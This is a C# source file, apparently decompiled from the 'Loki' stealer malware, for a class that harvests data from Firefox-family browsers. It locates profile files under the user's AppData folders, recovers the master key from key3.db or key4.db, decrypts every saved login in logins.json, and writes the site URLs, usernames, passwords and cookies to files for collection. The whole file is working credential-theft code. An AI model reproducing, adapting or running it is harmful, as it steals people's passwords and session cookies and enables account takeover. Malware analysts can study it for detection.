using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using Loki.Gecko;
using NoiseMe.Drags.App.Models.JSON;
using loki.loki.Stealer.Cookies;
using loki.loki.Stealer.Passwords;
using loki.sqlite;

namespace loki.loki.Stealer;

public class mozila
{
	public static List<string> passwors = new List<string>();

	public static List<string> credential = new List<string>();

	public static readonly string LocalAppData = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local");

	public static readonly string TempDirectory = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local\\Temp");

	public static readonly string RoamingAppData = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Roaming");

	public static readonly byte[] Key4MagicNumber = new byte[16]
	{
		248, 0, 0, 0, 0, 0, 0, 0, 0, 0,
		0, 0, 0, 0, 0, 1
	};

	public static List<string> FindPaths(string baseDirectory, int maxLevel = 4, int level = 1, params string[] files)
	{
		List<string> list = new List<string>();
		if (files != null && files.Length != 0 && level <= maxLevel)
		{
			try
			{
				string[] directories = Directory.GetDirectories(baseDirectory);
				string[] array = directories;
				foreach (string path in array)
				{
					try
					{
						DirectoryInfo directoryInfo = new DirectoryInfo(path);
						FileInfo[] files2 = directoryInfo.GetFiles();
						bool flag = false;
						for (int j = 0; j < files2.Length; j++)
						{
							if (flag)
							{
								break;
							}
							for (int k = 0; k < files.Length; k++)
							{
								if (flag)
								{
									break;
								}
								string text = files[k];
								FileInfo fileInfo = files2[j];
								if (text == fileInfo.Name)
								{
									flag = true;
									list.Add(fileInfo.FullName);
								}
							}
						}
						foreach (string item in FindPaths(directoryInfo.FullName, maxLevel, level + 1, files))
						{
							if (!list.Contains(item))
							{
								list.Add(item);
							}
						}
						directoryInfo = null;
					}
					catch
					{
					}
				}
				return list;
			}
			catch
			{
				return list;
			}
		}
		return list;
	}

	public static void Creds(string profile, string browser_name, string profile_name)
	{
		try
		{
			if (File.Exists(Path.Combine(profile, "key3.db")))
			{
				Lopos(profile, p3k(CreateTempCopy(Path.Combine(profile, "key3.db"))), browser_name, profile_name);
			}
			Lopos(profile, p4k(CreateTempCopy(Path.Combine(profile, "key4.db"))), browser_name, profile_name);
		}
		catch (Exception)
		{
		}
	}

	public static void mozila_still()
	{
		List<string> list = new List<string>();
		list.AddRange(FindPaths(LocalAppData, 4, 1, "key3.db", "key4.db", "cookies.sqlite", "logins.json"));
		list.AddRange(FindPaths(RoamingAppData, 4, 1, "key3.db", "key4.db", "cookies.sqlite", "logins.json"));
		foreach (string item in list)
		{
			string fullName = new FileInfo(item).Directory!.FullName;
			string browser_name = (item.Contains(RoamingAppData) ? prbn(fullName) : plbn(fullName));
			string name = GetName(fullName);
			CookMhn(fullName, browser_name, name);
			Creds(fullName, browser_name, name);
		}
	}

	private static string GetName(string path)
	{
		try
		{
			return path.Split(new char[1] { '\\' }, StringSplitOptions.RemoveEmptyEntries)[^1];
		}
		catch
		{
		}
		return "Unknown";
	}

	public static string CreateTempCopy(string filePath)
	{
		string text = CreateTempPath();
		File.Copy(filePath, text, overwrite: true);
		return text;
	}

	public static string CreateTempPath()
	{
		return Path.Combine(TempDirectory, "tempDataBase" + DateTime.Now.ToString("O").Replace(':', '_') + Thread.CurrentThread.GetHashCode() + Thread.CurrentThread.ManagedThreadId);
	}

	public static void CookMhn(string profile, string browser_name, string profile_name)
	{
		try
		{
			string filePath = Path.Combine(profile, "cookies.sqlite");
			CNT cNT = new CNT(CreateTempCopy(filePath));
			cNT.ReadTable("moz_cookies");
			for (int i = 0; i < cNT.RowLength; i++)
			{
				GetCookies.CCookies++;
				try
				{
					GetCookies.domains.Add(cNT.ParseValue(i, "host").Trim());
					GetCookies.Cookies_Gecko.Add(cNT.ParseValue(i, "host").Trim() + "\t" + (cNT.ParseValue(i, "isSecure") == "1") + "\t" + cNT.ParseValue(i, "path").Trim() + "\t" + (cNT.ParseValue(i, "isSecure") == "1") + "\t" + cNT.ParseValue(i, "expiry").Trim() + "\t" + cNT.ParseValue(i, "name").Trim() + "\t" + cNT.ParseValue(i, "value") + Environment.NewLine);
				}
				catch
				{
				}
			}
			using StreamWriter streamWriter = new StreamWriter(Program.dir + "\\Browsers\\" + profile_name + "_" + browser_name + "_Cookies.txt");
			for (int j = 0; j < GetCookies.Cookies_Gecko.Count(); j++)
			{
				streamWriter.Write(GetCookies.Cookies_Gecko[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static void Lopos(string profile, byte[] privateKey, string browser_name, string profile_name)
	{
		try
		{
			string path = CreateTempCopy(Path.Combine(profile, "logins.json"));
			if (!File.Exists(path))
			{
				return;
			}
			foreach (JsonValue item in (IEnumerable)File.ReadAllText(path).FromJSON()["logins"])
			{
				GetPasswords.Cpassword++;
				Gecko4 gecko = Gecko1.Create(Convert.FromBase64String(item["encryptedUsername"].ToString(saving: false)));
				Gecko4 gecko2 = Gecko1.Create(Convert.FromBase64String(item["encryptedPassword"].ToString(saving: false)));
				string text = Regex.Replace(Gecko6.lTRjlt(privateKey, gecko.Objects[0].Objects[1].Objects[1].ObjectData, gecko.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);
				string text2 = Regex.Replace(Gecko6.lTRjlt(privateKey, gecko2.Objects[0].Objects[1].Objects[1].ObjectData, gecko2.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);
				credential.Add(string.Concat("Site_Url : ", item["hostname"], Environment.NewLine, "Login : ", text, Environment.NewLine, "Password : ", text2, Environment.NewLine));
			}
			for (int i = 0; i < credential.Count(); i++)
			{
				passwors.Add("Browser : " + browser_name + Environment.NewLine + "Profile : " + profile_name + Environment.NewLine + credential[i]);
			}
			credential.Clear();
		}
		catch (Exception)
		{
		}
	}

	private static byte[] p4k(string file)
	{
		byte[] result = new byte[24];
		try
		{
			if (!File.Exists(file))
			{
				return result;
			}
			CNT cNT = new CNT(file);
			cNT.ReadTable("metaData");
			string s = cNT.ParseValue(0, "item1");
			string s2 = cNT.ParseValue(0, "item2)");
			Gecko4 gecko = Gecko1.Create(Encoding.Default.GetBytes(s2));
			byte[] objectData = gecko.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
			byte[] objectData2 = gecko.Objects[0].Objects[1].ObjectData;
			Gecko8 gecko2 = new Gecko8(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), objectData);
			gecko2.method_0();
			Gecko6.lTRjlt(gecko2.DataKey, gecko2.DataIV, objectData2);
			cNT.ReadTable("nssPrivate");
			int rowLength = cNT.RowLength;
			string s3 = string.Empty;
			for (int i = 0; i < rowLength; i++)
			{
				if (cNT.ParseValue(i, "a102") == Encoding.Default.GetString(Key4MagicNumber))
				{
					s3 = cNT.ParseValue(i, "a11");
					break;
				}
			}
			Gecko4 gecko3 = Gecko1.Create(Encoding.Default.GetBytes(s3));
			objectData = gecko3.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
			objectData2 = gecko3.Objects[0].Objects[1].ObjectData;
			gecko2 = new Gecko8(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), objectData);
			gecko2.method_0();
			result = Encoding.Default.GetBytes(Gecko6.lTRjlt(gecko2.DataKey, gecko2.DataIV, objectData2, PaddingMode.PKCS7));
			return result;
		}
		catch (Exception)
		{
			return result;
		}
	}

	private static byte[] p3k(string file)
	{
		byte[] array = new byte[24];
		try
		{
			if (!File.Exists(file))
			{
				return array;
			}
			new DataTable();
			Gecko9 berkeleyDB = new Gecko9(file);
			Gecko7 gecko = new Gecko7(vbv(berkeleyDB, (string x) => x.Equals("password-check")));
			string hexString = vbv(berkeleyDB, (string x) => x.Equals("global-salt"));
			Gecko8 gecko2 = new Gecko8(ConvertHexStringToByteArray(hexString), Encoding.Default.GetBytes(string.Empty), ConvertHexStringToByteArray(gecko.EntrySalt));
			gecko2.method_0();
			Gecko6.lTRjlt(gecko2.DataKey, gecko2.DataIV, ConvertHexStringToByteArray(gecko.Passwordcheck));
			Gecko4 gecko3 = Gecko1.Create(ConvertHexStringToByteArray(vbv(berkeleyDB, (string x) => !x.Equals("password-check") && !x.Equals("Version") && !x.Equals("global-salt"))));
			Gecko8 gecko4 = new Gecko8(ConvertHexStringToByteArray(hexString), Encoding.Default.GetBytes(string.Empty), gecko3.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData);
			gecko4.method_0();
			Gecko4 gecko5 = Gecko1.Create(Gecko1.Create(Encoding.Default.GetBytes(Gecko6.lTRjlt(gecko4.DataKey, gecko4.DataIV, gecko3.Objects[0].Objects[1].ObjectData))).Objects[0].Objects[2].ObjectData);
			if (gecko5.Objects[0].Objects[3].ObjectData.Length <= 24)
			{
				array = gecko5.Objects[0].Objects[3].ObjectData;
				return array;
			}
			Array.Copy(gecko5.Objects[0].Objects[3].ObjectData, gecko5.Objects[0].Objects[3].ObjectData.Length - 24, array, 0, 24);
			return array;
		}
		catch (Exception)
		{
			return array;
		}
	}

	public static byte[] ConvertHexStringToByteArray(string hexString)
	{
		if (hexString.Length % 2 != 0)
		{
			throw new ArgumentException(string.Format(CultureInfo.InvariantCulture, "The binary key cannot have an odd number of digits: {0}", hexString));
		}
		byte[] array = new byte[hexString.Length / 2];
		for (int i = 0; i < array.Length; i++)
		{
			string s = hexString.Substring(i * 2, 2);
			array[i] = byte.Parse(s, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
		}
		return array;
	}

	private static string vbv(Gecko9 berkeleyDB, Func<string, bool> predicate)
	{
		string text = string.Empty;
		try
		{
			foreach (KeyValuePair<string, string> key in berkeleyDB.Keys)
			{
				if (predicate(key.Key))
				{
					text = key.Value;
				}
			}
		}
		catch (Exception)
		{
		}
		return text.Replace("-", string.Empty);
	}

	private static string prbn(string profilesDirectory)
	{
		string text = string.Empty;
		try
		{
			string[] array = profilesDirectory.Split(new string[1] { "AppData\\Roaming\\" }, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
			text = ((!(array[2] == "Profiles")) ? array[0] : array[1]);
		}
		catch (Exception)
		{
		}
		return text.Replace(" ", string.Empty);
	}

	private static string plbn(string profilesDirectory)
	{
		string text = string.Empty;
		try
		{
			string[] array = profilesDirectory.Split(new string[1] { "AppData\\Local\\" }, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
			text = ((!(array[2] == "Profiles")) ? array[0] : array[1]);
		}
		catch (Exception)
		{
		}
		return text.Replace(" ", string.Empty);
	}
}
